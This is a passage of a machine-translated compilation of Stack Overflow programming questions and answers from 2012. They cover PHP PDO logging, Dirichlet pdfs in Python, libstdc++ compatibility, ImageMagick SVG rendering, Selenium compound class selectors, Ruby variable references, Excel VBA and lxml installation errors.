要考虑的事情是 using`.bind()`迭代整个选定元素列表并在每个元素上运行绑定函数。因此，如果您有大量元素（数百个或更多），那么您可能只想绑定到当前页面上的元素。但是，如果您正在处理一些元素，比如少于 100 个，那么您不需要执行委托事件绑定的额外步骤。

If you bind to all the elements at once then you can run the code inside the `document.ready` event handler or simply place the JS code at the end of the HTML document so all the elements on the page are available when the JS runs.

# php - 在 PHP + PDO 中获取最后执行的查询的详细信息或用相应的条目填充查询中的问号

> ID：10658865
> 
> 赞同：0
> 
> 时间：2012-05-18T19:50:28.883
> 
> 标签：php, pdo

成功执行查询后，我需要使用填充值获取完整的查询（**基本上我希望查询字符串中删除了查询中的问号并替换为相应的值**），以便我可以将其用于事务日志记录。

下面是我正在使用的代码行

```
$stmt1 = $dbh->prepare("INSERT INTO announcements(id,routeID,ServiceAdvisoryID,ServiceAdvisoryDetailsId) 
VALUES (?,?,?,?)");
        $stmt1->execute(array($aid,$route,$anctype,$announcementid)); 
```

用于事务记录的查询是

```
 $transactionText = "INSERT INTO announcements(id,routeID,ServiceAdvisoryID,ServiceAdvisoryDetailsId) VALUES (?,?,?,?)";
$stmt2 = $dbh->prepare("insert into transactionLog_tbl(userName,transactionTypeId,transactionTime,transactionText)values(?,?,?,?)");
            $stmt2->execute(array($_SESSION['username'],1,date("y.d.m"),$transactionText)); 
```

**我希望事务文本具有用相应值填充的问号。**

要不然

**我可以通过 PDO 获得最后执行的 ROW。我知道我们可以获得 ID，但我们也可以获得完整的行吗？**

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-18T19:56:23.733

如果您使用的是 MySQL，您可以在那里登录，他们将（很可能）拥有完整的 SQL 语句。这是因为 PDO 默认模拟准备并实际将完全构建的 SQL 字符串发送到 MySQL 服务器。从[手册`PDO::setAttribute`页](http://php.net/manual/en/pdo.setattribute.php)：

> **PDO::ATTR_EMULATE_PREPARES**启用或禁用准备语句的模拟。一些驱动程序不支持本机准备语句或对它们的支持有限。使用此设置可强制 PDO 始终模拟预准备语句（如果为 TRUE），或尝试使用本机预准备语句（如果为 FALSE）。如果驱动程序无法成功准备当前查询，它将始终回退到模拟准备好的语句。

PHP 开发团队表示，其原因是仿真在相对较旧的 MySQL 版本上执行得更快，这些版本仍然在大多数 LAMP 堆栈安装中。随着更多人使用较新版本的 MySQL + 本机驱动程序，此默认行为将很快更改。

否则，您可以自己构建完整的 SQL，因为您已经拥有语句和参数。

# python - 在python中计算Dirichlet分布的pdf

> ID：10658866
> 
> 赞同：6
> 
> 时间：2012-05-18T19:50:30.050
> 
> 标签：python, numpy, statistics, scipy, probability

我想在 python 中计算 Dirichlet 分布的 pdf，但在任何类型的标准库中都找不到这样做的代码。scipy.stats 包含一长串分布，但似乎不包括 Dirichlet，并且 numpy.random.mtrand 从中提取一个样本，但不提供 pdf。

由于 Dirichlet 很常见，我想知道是否应该在 scipy.stats 或类似名称中搜索其他名称，或者我是否只是以某种方式错过了它。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-18T20:49:45.547

我在 numpy 中找不到一个，但它看起来足以实现。这是一个丑陋的小单线。（我遵循了维基百科上给出的函数，除了你必须提供 x = [x1, ..., xk] 和 alpha = [a1, ..., ak]）。

```
import math
import operator

def dirichlet_pdf(x, alpha):
  return (math.gamma(sum(alpha)) / 
          reduce(operator.mul, [math.gamma(a) for a in alpha]) *
          reduce(operator.mul, [x[i]**(alpha[i]-1.0) for i in range(len(alpha))])) 
```

警告：我没有测试过这个。让我知道它是否有效。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2015-11-03T02:05:44.673

从 scipy[版本 0.15](http://scipy.github.io/devdocs/release.0.15.0.html#scipy-stats-improvements)开始，您可以使用`scipy.stats.dirichlet.pdf` （请参阅[此处](http://scipy.github.io/devdocs/generated/scipy.stats.dirichlet.html)）

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-05-18T20:23:40.923

您可以从伽马分布推导出狄利克雷分布。这显示在[维基百科页面上](http://en.wikipedia.org/wiki/Dirichlet_distribution)。在那里你可以找到这个 python 代码：

```
 params = [a1, a2, ..., ak]
    sample = [random.gammavariate(a,1) for a in params]
    sample = [v/sum(sample) for v in sample] 
```

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2012-05-19T00:54:43.407

我认为它可能包含在[`numpy.random.mtrand.dirichlet`](http://docs.scipy.org/doc/numpy/reference/generated/numpy.random.mtrand.dirichlet.html)但我不完全确定这是 pdf 还是用于采样。

# c++ - gcc 和 libstdc++ 向前兼容性

> ID：10658870
> 
> 赞同：5
> 
> 时间：2012-05-18T19:51:06.813
> 
> 标签：c++, linux, gcc, gnu, backwards-compatibility

根据[ABI 政策和指南](http://gcc.gnu.org/onlinedocs/libstdc++/manual/abi.html)，我是否应该使用

```
GCC 3.4.0 and libstdc++.so.6.0.0 
```

编译可在每个`GNU/Linux`发行版（相同的 CPU 架构）上运行的二进制可执行文件，并`libstd++.so.6`安装了任何较新的版本？这个二进制文件是否与每一个都向前兼容`libstd++.so.6`？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-19T04:41:59.033

（为什么不在 gcc-help 邮件列表上问这个问题，这样你就可以从知道他们在说什么的人那里得到权威的答案？）

是的，链接到 libstdc++.so.6.0.0 意味着二进制文件可以在链接到任何更高版本的 libstdc++.so 时运行，但这不足以确保二进制文件可以在任何 GNU/Linux 系统上运行。您还需要确保使用旧版本的 libc.so (ieglibc) 和您链接的任何其他库。使用 GCC 3.4.0 编译和链接但链接到 Glibc 2.15 可能意味着您的二进制文件无法在 Glibc 2.14 或更早版本的系统上运行，无论它们具有什么 libstdc++ 版本。

# svg - 使用 ImageMagick 的 SVG 到 PNG 转换不处理 defs？

> ID：10658872
> 
> 赞同：2
> 
> 时间：2012-05-18T19:51:09.217
> 
> 标签：svg, imagemagick

答案在我标记的答案上，但在评论中。基本上，见这里：[http ://www.imagemagick.org/discourse-server/viewtopic.php?f=1&t=18816](http://www.imagemagick.org/discourse-server/viewtopic.php?f=1&t=18816)

在带有端口的 Mac 上运行它：

```
sudo port install ImageMagick +rsvg 
```

这是我原来的问题：

我的 test.svg 文件在这里：[https ://gist.github.com/2727243](https://gist.github.com/2727243)

Imagemagick 版本：ImageMagick 6.7.6-9 2012-05-18 Q16（今天刚刚更新）

我有一个 SVG 文件，它使用 defs -> 符号来定义箭头符号。稍后在文档中我 xlink:use 该符号。这在 Chrome 中运行良好，箭头出现并处于正确位置：

![在此处输入图像描述](../Images/a8c53876226a3e379347063c3584f1c4.png)

但是，如果我像这样通过 imagemagick 转换图像：

```
convert test.svg test.png 
```

它不起作用。这是我得到的：

![在此处输入图像描述](../Images/7af38ad1f3643a48f9d8b47564e0e39a.png)

“使用”似乎被完全忽略了，而是箭头在 def 处呈现。至少，据我所知。

我的 SVG 格式是否错误，以便 Imagemagick 处理这种情况？或者这只是 Imagemagick 不能正确支持的东西？我一直在寻找一个明确的答案，但找不到一个，一种方式或另一种方式。

我也在这里尝试了 SVG：http: [//www.carto.net/svg/samples/symbol.svg](http://www.carto.net/svg/samples/symbol.svg)并且符号不起作用。所以我倾向于 Imagemagick 是罪魁祸首。

更新：我尝试将 def 更改为以下内容：

```
<symbol id="arrow" x="25"> 
```

在浏览器中，箭头确实向右移动了 25，但在 Imagemagick 中，它一直停留在 (0,0)。这让我相信它与符号定义无关，更多的是关于它没有正确翻译它。但是，即使我尝试对“使用”进行直接变换，甚至更好地完全删除“使用”，箭头仍然会出现。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-18T20:30:54.640

**更新：**这似乎是 ImageMagick 中默认 SVG 渲染器中的一个错误，它忽略标签上的`x`和（也忽略标签上的变换属性）。尝试改用 rsvg 后端。`y``use``g`

如果你改变它是否有效：

```
<use xlink:href="#arrow" x="20" y="50"></use> 
```

至：

```
<g transform="translate(20 50)">
  <use xlink:href="#arrow"></use>
</g> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-19T11:19:39.727

您能否详细说明为什么*必须*使用 IM？如果事实证明 IM 在这种情况下毫无用处，那么您肯定必须使用其他东西吗？为此，我第二次使用 Inkscape。

也就是说，如果您愿意进行一些 XML 操作，也许您仍然可以使用 IM。我认为符号的内容可以单独复制到它们的`<use>`位置；如果你有很多使用相同的符号，这是一个混乱的解决方法，但如果你想坚持使用 IM，这可能是你唯一的出路。我正在研究使 IM 混淆的是符号系统的理论——如果路径是“内联”的，那可能没问题。

# html - 保持所有 LI 的边框高度相同

> ID：10658874
> 
> 赞同：1
> 
> 时间：2012-05-18T19:51:10.420
> 
> 标签：html, css

我有一个带有嵌套 UL 的菜单。是否有一种纯 CSS 方法可以让垂直边框保持在最高菜单项集的高度？请记住，此菜单是动态的，因此宽度和高度都可以更改。

![在此处输入图像描述](../Images/28f7009d1b6537af7bc44d3c1b4eb88b.png)

[http://jsfiddle.net/simply_simpy/Kmyjr/](http://jsfiddle.net/simply_simpy/Kmyjr/)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-18T20:01:33.447

您可以删除`float:left`规则并添加`display:table-cell`规则。

**[jsFiddle 示例](http://jsfiddle.net/j08691/Kmyjr/11/)**。

CSS：

```
#menu-secondary_menu > li {
    border-left: 1px solid #7d7d7d;
    display: table-cell;
    font-size: 9px;
    line-height: 16px;
    text-transform: uppercase;
    color: #7d7d7d;
    padding: 0 10px 0;
    margin: 0 10px 0;
} 
```

# ios - 有 OCR-Phonegap 插件吗？

> ID：10658878
> 
> 赞同：2
> 
> 时间：2012-05-18T19:51:30.003
> 
> 标签：ios, ocr, phonegap-plugins

我正在使用 gwt-phonegap 为 ipad 构建一个应用程序（因为我对目标 c 了解不多，也无意学习它）。

我遇到了一个问题，我需要使用 OCR 来解析捕获的图像，然后将结果显示给用户。

有没有人遇到过我可以使用的phonegap插件，或者任何人都可以建议我实现这一目标的方法？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-11T07:29:30.970

您可以在为 2.0 版本更新的存储库中查找此插件：

[https://github.com/jcesarmobile/PhonegapOCRPlugin](https://github.com/jcesarmobile/PhonegapOCRPlugin)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-21T10:48:14.643

我创建了这个 OCR 插件

[http://goo.gl/9To23](http://goo.gl/9To23)

它使用 tessearc OCR 库。

我已经用 phonegap 1.8 和 1.9 对其进行了测试

编辑：刚刚更新了存储库，现在包含了最新版本的 tesseract，现在它适用于 phonegap 2.0.0 和 2.1 RC2（我想，我只测试了 2.1 RC2，但我解决了重复的主符号）

# javascript - html或javascript，如何找出程序文件文件夹在哪里？

> ID：10658886
> 
> 赞同：1
> 
> 时间：2012-05-18T19:52:04.443
> 
> 标签：javascript, html, directory

我有一些我想在用户本地机器（离线）中运行的 HTML 文件。有什么方法可以找出程序文件文件夹位于哪个**硬盘驱动器中？**

**注意：**您知道任何不会引发安全问题的方法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T19:56:48.420

有一个`file system api`-`HTML5`看看[文档草案](http://dev.w3.org/2009/dap/file-system/pub/FileSystem/#idl-def-FileSystem)

如果您是`requestFileSystem()`第一次调用，**则会为您的应用创建新的存储空间**。重要的是要记住这个文件系统是沙盒的，这意味着一个 Web 应用程序无法访问另一个应用程序的文件。这也意味着您无法将文件读/写到用户硬盘上的任意文件夹（例如我的图片、我的文档等）。

因此，如果您正在考虑一个能够浏览用户程序文件夹的网页，那么答案是否定的，您将需要某种应用程序引擎——例如[Adob​​e Air](http://www.adobe.com/devnet/air/flex/articles/exploring_file_capabilities.html)或 Windows8 Metro 应用程序。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-18T19:58:49.877

基本上没有跨浏览器的方式来做到这一点。如果您可以使用仅 Internet Explorer 的解决方案，请尝试查看名为 FileSystemObject 的 ActiveX 组件及其 GetSpecialFolder 方法 - [http://msdn.microsoft.com/en-us/library/aa265315%28v=vs.60 %29.aspx](http://msdn.microsoft.com/en-us/library/aa265315%28v=vs.60%29.aspx)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-18T20:01:03.380

我觉得这个问题很困惑。并非每台计算机都有“程序文件”目录甚至驱动器的概念，因为并非每台计算机都是 Windows。

最重要的是，HTML5 离线模式[只需要一个清单文件由您的 Web 服务器托管](http://marakana.com/bookshelf/html5_tutorial/offline_applications.html)。浏览器会将缓存的数据放在正确的位置。

如果您正在谈论非托管页面的一些内部部署并想直接生成 IE，我认为这是一个坏主意，但使用`%ProgramFiles%`环境变量。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-18T20:04:53.590

我不在 Windows 上，但似乎你可以尝试这样的事情：

```
var WshShell = new ActiveXObject('WScript.Shell');
Response.write("ProgramFiles envioronment variable is set to:\n\n" + 
               WshShell.ExpandEnvironmentStrings('%ProgramFiles%')); 
```

程序文件位于环境变量中，这就是您要查找的内容。

问候，

PS：这将导致您收到一些安全警告。实际上，这并不安全。

# fancybox - Fancybox 2 上的水平过渡

> ID：10658887
> 
> 赞同：0
> 
> 时间：2012-05-18T19:52:09.317
> 
> 标签：fancybox

我需要 Fancybox 2 关于图像转换的帮助。该脚本正在垂直创建过渡，我希望过渡是从右到左的，就像在网络上找到的大多数灯箱脚本一样。我只找到了一个解释，但它不是“从右到左”而是“从左到右”。

有人对此问题有提示或解决方案吗？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T15:09:54.367

在 中`.js`，查找这 3 个字符串

```
(g.top=n(parseInt(g.top,10)-200),i.top="+=200px") 
```

和

```
f.top="+=200px" 
```

**做了什么**

这是我为实现水平过渡所做的更改。

对于第一个字符串，

```
(g.top=n(parseInt(g.top,0)-0),i.left="+=0px") 
```

对于第二个字符串，

```
f.left="+=200px" 
```

希望这可以帮助！

# javascript - Youtube javascript api onStateChange 并不总是有效

> ID：10658889
> 
> 赞同：0
> 
> 时间：2012-05-18T19:52:36.470
> 
> 标签：javascript, youtube

正如您在我的网站 [http://www2.outofscopes.com/test/index.html中看到的那样](http://www2.outofscopes.com/test/index.html)

我试图让 youtube api 通过提醒它来通知我 onStateChange 中的任何事件。使用这个 javascript：

```
 function onYouTubePlayerAPIReady() {
        player = new YT.Player('player', {
            videoId: '-cSFPIwMEq4',
            events: {
                'onStateChange': function (event) {

                    alert(event.data);
                }
            }
        });
    } 
```

但是在 chrome 和 firefox（主要是 firefox）中，它仅在重新加载页面时才会发出警报。

为什么会这样？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T20:20:08.260

你可以试试这个。[http://jsfiddle.net/NrHdq/](http://jsfiddle.net/NrHdq/)

```
 <iframe src="http://www.youtube.com/embed/-cSFPIwMEq4" onload="floaded()" title="YouTube video player" id="player" allowfullscreen="" frameborder="0" height="400" width="900"></iframe>

<script>
    //onYouTubePlayerAPIReady
    function floaded() {
        player = new YT.Player('player', {
            videoId: '-cSFPIwMEq4',
            events: {
                'onStateChange': function (event) {

                    alert(event.data);
                }
            }
        });
    }

</script>

</body> 
```

​</p>

# java - 从页面的无元素部分中提取文本

> ID：10658898
> 
> 赞同：2
> 
> 时间：2012-05-18T19:53:28.600
> 
> 标签：java, jsoup

我目前有来自网页的以下 HTML 代码部分：

```
<td class="movieclass">
<b>Cinema 1</b>
    10.30 AM. + 12.45 + 3.00 + 5.15 + 7.30 + 9.45 + 12.00 MN.
<br />

<b>Cinema 2</b>
    3.00 + 5.15 + 7.30 + 9.45 + (12.00 MN. THRS./FRI.)
<br />

<b>Cinema 3</b>
    2.30 + 4.45 + 7.00 + 9.15  + (12.15 PM. + 11.30 PM. THRS./FRI.)
<br />

<b>Cinema 4</b>
    11.30 AM. + 2.00 + 4.30 + 7.00 + 9.30 + 12.00 MN.
<br />

<b>Cinema 5</b>
    10.30 AM. + 1.00 + 3.30 + 6.00 + 8.30 + 11.00 PM.
<br />
</td> 
```

我正在尝试使用 jsoup 来尝试提取时间，但是对于特定的电影院。我假设如果时间线在段落（p 标签）内，我可以使用以下内容进行提取：

```
Elements movieTime = doc.select("a:contains(Cinema 3) + p"); 
```

但是，在上面的代码中，带有时间的行周围没有标签。有没有办法提取某个电影院的时间线？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-18T20:05:29.953

如果您提供的文档始终保持相同的结构，则总有办法手动执行此操作。然后您可以简单地将所有文档读取到某种列表中。例如 ArrayList。

然后遍历该列表并使用 if 语句进行检查

```
if (line.get(0).equals("Cinema 1")) {
  timeOfCinema1 = line.get(1);
} 
```

但这是最简单且不是“好”的方法。您可以使用`Map<String, String>`来映射线条，或创建一个保存文档结构的对象。

希望这可以帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-21T07:58:13.313

我决定用页面的 HTML 创建一个 jsoup 文档：

```
String doc = Jsoup.connect("http://www.example.com").get().html(); 
```

然后对文档进行了一些字符串替换：

```
doc = doc.replaceAll("<b>","<p>");
doc = doc.replaceAll("</b>","</p><p>"); 
```

替换似乎有点极端，因为它要遍历整个文档，但我只需要在我需要提取的部分周围添加一些标签。最后提取：

```
Document newDoc = Jsoup.parse(doc);
String movieTimes = newDoc.select("p:contains(Cinema 2) + p").text();
System.out.println(movieTimes); //Should print only text within <p> after Cinema 2 
```

# ruby - 获取全局变量指向的当前值

> ID：10658899
> 
> 赞同：2
> 
> 时间：2012-05-18T19:53:36.947
> 
> 标签：ruby

我有一些这样写的代码

```
$var1 = 2
$var2 = 4
...

关键字 = {"one" => $var1, "two" => $var2, ...}

```

问题是，当我散列到 时，我想获取存储在该变量中的值`keywords`，但是当我需要变量时，ruby 似乎并没有重新评估它们。所以如果`$var1`在执行过程中被改变了，`keywords["one"]`仍然返回原来的值`2`

如何更改哈希，以便我首先确定我需要访问哪个变量，然后去获取它的值？

有相当多的全局变量（它们没有使用数组？），我不想有多余的 case/when 或 if/elsif 块。

编辑：一个更精确的问题是

“如何检索变量当前指向的值？”

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-18T20:01:21.480

一般来说，这似乎是个坏主意。而不是更新 $var1 只需更新哈希并始终通过关键字访问 $var1 ["one"]

您可以使用 eval，但这不是一个好的解决方案：

```
$var1 = 2
$var2 = 4
...
keywords = {"one" => "$var1", "two" => "$var2", ...}
$var1 = 6
var1 = eval(keywords["one"])  # -> 6 
```

更新：请注意，eval 将获取您传入的任何代码并执行它。你需要非常小心，你正在评估的东西是你期望的形式。这可能是一个很大的安全风险。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-18T19:58:28.010

变量不*包含*值，它们*引用*它们。当你写：

```
foo = 2
bar = [foo]
foo = 4 
```

......它不会`bar`导致`[4]`。〜发生的是：

1.  `2`在内存中创建一个值并设置变量`foo`以引用它。
2.  创建一个新数组，其第一个槽引用`foo`(ie `2`) 引用的值，并将变量设置`bar`为引用该数组。
3.  在内存中创建一个值`4`并更改变量`foo`以引用它。

一些可变的对象类型。例如，您可以将 String 或 Array 的实际内容更改为不同的内容。在这种情况下，对该值的所有引用都反映了更改：

```
foo = "hello"
bar = [foo]
foo[0] = "j"
p bar        #=> ["jello"] 
```

然而，数字是不可变的。如果您想要一个数字的“句柄”而不是您可以更改的数字并且对该数字的所有其他引用都更改，则需要将该数字包装在可变数据类型中。例如：

```
$var1 = [2]
keywords = { "one"=>$var1 }
p keywords["one"][0] #=> 2
$var1[0] = 4
p keywords["one"][0] #=> 4 
```

现在，如果您的值*不是*数字，而是字符串（正如“关键字”所暗示的那样），那么您可以改变并完全替换它们：

```
$var1 = "foo"
keywords = { "one"=>$var1 }
$var1.replace( "bar" )
p keywords["one"]           #=> "bar" 
```

关键是**您必须调用对象本身的方法**（并且该方法必须更改对象本身，而不是返回新对象）；你不能使用变量赋值来完成这项工作。例如，请参阅[`String#replace`](http://www.ruby-doc.org/core-1.9.3/String.html#method-i-replace)。

# json - ServiceStack 自定义合约解析器

> ID：10658904
> 
> 赞同：1
> 
> 时间：2012-05-18T19:54:08.450
> 
> 标签：json, servicestack, contract, resolver

是否可以为内置的 JsonSerializer 提供某种自定义合同解析器？

响应数据的格式如下：

```
{
  "name":"Rob Angelier"
} 
```

我要设置的属性是：**名称**

问题是：我怎样才能将骆驼大小写反序列化为帕斯卡大小写？

希望你能帮帮我！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T23:27:39.170

您可以使用以下任一方式获取 name 属性：

```
string name = JsonObject.Parse(json)["name"]; 
```

否则，您可以创建一个与要反序列化的 JSON 匹配的强类型类，例如：

```
class Contact { 
    public string Name { get; set; }
}
var contact = json.FromJson<Contact>(); 
```

在 ServiceStack JSON 测试套件中，您可以找到[多种不同的方法](https://github.com/ServiceStack/ServiceStack.Text/blob/master/tests/ServiceStack.Text.Tests/UseCases/GitHubRestTests.cs)来反序列化同一事物。

# python - Selenium python find_element_by_class_name() 从 v 2.2 到 2.21 停止工作——不能使用“复合类名”

> ID：10658907
> 
> 赞同：11
> 
> 时间：2012-05-18T19:54:35.370
> 
> 标签：python, selenium, selenium-webdriver, webdriver, class-names

我正在使用 Selenium 的 python 库从 Firefox 的 html 页面中抓取数据。

我不得不从 Selenium 2.0 更新到 2.21，因为服务器已经更新了 Firefox。

在 v 2.21 中，调用`find_element_by_class_name("grid-cell-inner grid-col-name")`失败并显示：

```
selenium.common.exceptions.WebDriverException: Message: u'Compound class names not permitted' 
```

我试图访问的元素的类名是`grid-cell-inner grid-col-name`

调用`find_element_by_class_name()`在 v 2.2 中有效，因此逻辑是正确的，并且以前可以找到数据。v 2.21 中发生了一些变化。

所有 Selenium 示例都提供了带有类名`foo`等的简单示例，而没有一个具有我需要访问的名称类型的示例。

为什么 Selenium 停止支持查找名称为 的类`grid-cell inner grid-col-name`，以及他们的解决方案是什么？

有人可以帮我找到带有“复合”类名的元素吗？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-05-20T11:02:03.980

WebDriver 的问题在于它仍在发展。很多。我个人不知道在一个命令中支持多个类搜索的版本，所以它一定是一个相当古老的版本:)。

但是，通过[CSS 选择器](http://www.w3.org/TR/CSS2/selector.html)搜索应该可以：

```
find_element_by_css_selector(".grid-cell-inner.grid-col-name"); 
```

我不建议对这个特定的事情使用[XPath](http://www.w3.org/TR/xpath/)，因为以下两个表达式是不同的：

`//*[class='grid-cell-inner grid-col-name']`

`//*[class='grid-col-name grid-cell-inner']`

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-08-27T10:57:51.300

您需要使用格式为“.nameA.nameB.nameC”的 CssSelector，您可以拥有任意数量的 CssSelector，只需添加“.”即可。

或者，您可以匹配整个属性（您也可以使用 xpath 执行此操作）：“ *[class='exact class name here']” XPath - “//* [@class='exact class name here']”

如果类是动态生成的，有一些方法可以**开始**或**结束**或**包含**（在 CSS 和 xpath 中）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-18T23:33:12.240

我想 Selenium 很长一段时间都不支持复合类名。

不用说，尝试通过 XPath 或 CSS 选择器或通过“grid-cell-inner”的类名，然后过滤以查看哪些元素具有“grid-cell-inner grid-col-name”类。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-10-05T19:01:21.013

也试试：

```
elements = bot.execute_script("""return document.getElementsByClassName('grid-cell-inner grid-col-name')""") 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2021-01-30T09:17:59.487

此错误消息...

```
selenium.common.exceptions.WebDriverException: Message: u'Compound class names not permitted' 
```

...意味着使用[复合类名称的](https://stackoverflow.com/questions/53528072/invalid-selector-compound-class-names-not-permitted-error-using-selenium/53536022#53536022)[定位器策略在使用](https://stackoverflow.com/questions/48369043/official-locator-strategies-for-the-webdriver/48376890#48376890)[Selenium](https://stackoverflow.com/questions/54459701/what-is-selenium-and-what-is-webdriver/54482491#54482491)时不再有效。

[从Selenium v​​2.40.0 更改列表](https://raw.githubusercontent.com/SeleniumHQ/selenium/trunk/java/CHANGELOG)中可以观察到此更改的痕迹，其中提到了为复合类名称使用添加正确的错误代码：

> *   针对无效的 css 选择器空类名和原子中的复合类名的情况实施了正确的错误代码。

* * *

## 解决方案

作为替代方案，您可以使用以下任一[定位器策略](https://stackoverflow.com/questions/48369043/official-locator-strategies-for-the-webdriver/48376890#48376890)：

*   使用`CSS_SELECTOR`：

    ```
    driver.find_element(By.CSS_SELECTOR, ".grid-cell-inner.grid-col-name") 
    ```

*   使用`XPATH`：

    ```
    driver.find_element(By.XPATH, "//*[@class='grid-cell-inner grid-col-name']") 
    ```

* * *

## 参考

您可以在以下位置找到一些相关的详细讨论：

*   [如何使用 Selenium 和 Python 定位具有多个类名的元素](https://stackoverflow.com/questions/60534244/how-to-locate-an-element-with-multiple-classnames-using-selenium-and-python/60534315#60534315)

# excel - Excel 宏，用于仅选择工作表中总行数的一半

> ID：10658908
> 
> 赞同：1
> 
> 时间：2012-05-18T19:54:45.183
> 
> 标签：excel, excel-2007, vba

我想知道是否有人可以帮助我解决这个问题..

我在一张 Excel 表中有大约 500,000 行……而在其他表格中我有大约 600,000 行……

那么如何在 Excel 中只选择一半的行...

我的意思是假设总数是 500,000 行......那么我想只选择其中的一半，即 250,000 行......

并复制它并将其放入新文件并再次应用宏以选择其中的一半，即 125,000...

请建议如何做到这一点。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-19T05:13:25.347

这段代码

*   用于`Find`识别特定工作表中真正的第一个和最后一个使用的行（我`ws`为工作表使用了一个变量，以防您想在非活动工作表上工作）
*   如果工作表不为空，则返回一个新范围，`rng3`该范围从第一个使用的行开始，并延伸第一行和最后一行之间距离的一半

    ```
    Sub GetHalfRows()
    Dim ws As Worksheet
    Dim rng1 As Range
    Dim rng2 As Range
    Dim rng3 As Range
    Set ws = ActiveSheet
    Set rng1 = ws.Cells.Find("*", ws.[a1], , , xlByRows, xlPrevious)
    Set rng2 = ws.Cells.Find("*", ws.Cells(Rows.Count, "A"), , , xlByRows, xlNext)
    If Not rng1 Is Nothing Then
        Set rng3 = ws.Range(rng2, rng2.Offset((rng1.Row - rng2.Row) / 2, 0)).EntireRow
        MsgBox "selected range is " & rng3.Address
    Else
        MsgBox ws.Name & " is empty"
    End If
    End Sub 
    ```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-21T02:14:53.903

试试这个：

```
Sub CopyHalfRows()
  Dim TargetWorkbook As Workbook
  Dim HalfRows As Range

  On Error GoTo HalfRowsImpossible
    Set HalfRows = ActiveSheet.UsedRange.Resize _
      (ActiveSheet.UsedRange.Rows.Count \ 2)
  On Error GoTo 0
  If Not HalfRows Is Nothing Then
    Set TargetWorkbook = Workbooks.Add
    HalfRows.Copy
    ActiveSheet.PasteSpecial
  End If
  Exit Sub
HalfRowsImpossible:
  MsgBox "Cannot halve worksheet"
  On Error GoTo 0
End Sub 
```

# python - 无法在 mac 上使用 easy_install 或 pip 安装

> ID：10658909
> 
> 赞同：1
> 
> 时间：2012-05-18T19:54:53.153
> 
> 标签：python, lxml, pip, easy-install, pycrypto

我正在尝试使用 easy_install （和 pip）安装 lxml 和 pycrypto 模块，但收到错误消息，例如

```
Running lxml-2.3.4/setup.py -q bdist_egg --dist-dir /tmp/easy_install-kGsWMh/lxml-2.3.4/egg-dist-tmp-Gjqy3f
Building lxml version 2.3.4.
Building without Cython.
Using build configuration of libxslt 1.1.24
In file included from /usr/include/limits.h:63,
                 from /Developer/usr/bin/../lib/gcc/powerpc-apple-darwin10/4.0.1/include/limits.h:10,
                 from /Library/Frameworks/Python.framework/Versions/2.6/include/python2.6/Python.h:19,
                 from src/lxml/lxml.etree.c:4:
/usr/include/sys/cdefs.h:540:4: error: #error Unknown architecture
In file included from /usr/include/limits.h:64,
                 from /Developer/usr/bin/../lib/gcc/powerpc-apple-darwin10/4.0.1/include/limits.h:10,
                 from /Library/Frameworks/Python.framework/Versions/2.6/include/python2.6/Python.h:19,
                 from src/lxml/lxml.etree.c:4:
/usr/include/machine/limits.h:10:2: error: #error architecture not supported
In file included from /usr/include/sys/_types.h:33,
                 from /usr/include/_types.h:27,
                 from /usr/include/stdio.h:67,
                 from /Library/Frameworks/Python.framework/Versions/2.6/include/python2.6/Python.h:33,
                 from src/lxml/lxml.etree.c:4:
/usr/include/machine/_types.h:36:2: error: #error architecture not supported
In file included from /usr/include/_types.h:27,
                 from /usr/include/stdio.h:67,
                 from /Library/Frameworks/Python.framework/Versions/2.6/include/python2.6/Python.h:33,
                 from src/lxml/lxml.etree.c:4:
/usr/include/sys/_types.h:94: error: syntax error before ‘__darwin_blkcnt_t’
    src/lxml/lxml.etree.c:165640: error: syntax error before ‘val’
    src/lxml/lxml.etree.c:165645: error: syntax error before ‘val’ 
```

布拉布拉。. .

```
src/lxml/lxml.etree.c:165645: error: syntax error before ‘val’

lipo: can't figure out the architecture type of: /var/folders/f3/2q2x2p015kzgd4nbrn_qwykh0000gn/T//cc1pnrww.out

error: command 'gcc-4.0' failed with exit status 1 
```

当我尝试安装 pycrypto 时，我也遇到了类似的语法错误。我尝试[了这个答案](https://stackoverflow.com/questions/1277124)，但徒劳无功。我尝试使用 setuptools-0.6c11-py2.6.egg 和 setuptools-0.6c11-py2.7.egg 设置 python 2.6 和 2.7 环境，但得到相同的输出。

我在网上搜索了很多，但找不到解决方案。

**编辑：**我在 macbook pro 2010 上使用 OSX 10.7，并安装了 XCode 4 和 3

在尝试上面链接中的命令时，我会将 args 替换为最新版本。

```
python setup.py build --static-deps --libxml2-version=2.7.8  --libxslt-version=1.1.26 
sudo python setup.py install 
```

我在其他帖子上阅读并尝试了这个

```
STATIC_DEPS=true sudo easy_install --allow-hosts=lxml.de,*.python.org lxml 
```

**解决方案：**

正如@jdi 建议的那样，我做了以下事情

```
